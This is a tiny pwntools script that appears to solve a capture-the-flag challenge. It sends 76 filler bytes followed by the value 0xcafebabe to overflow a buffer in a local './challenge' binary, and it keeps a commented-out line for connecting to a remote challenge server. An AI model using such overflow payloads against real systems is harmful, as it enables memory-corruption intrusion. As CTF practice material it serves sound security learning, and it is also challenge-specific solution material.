from pwn import *

io = process("./challenge")
#io = remote("3.110.66.92", 31792)
payload = b"a"*76
payload += p64(0xcafebabe)
io.sendline(payload)
io.interactive()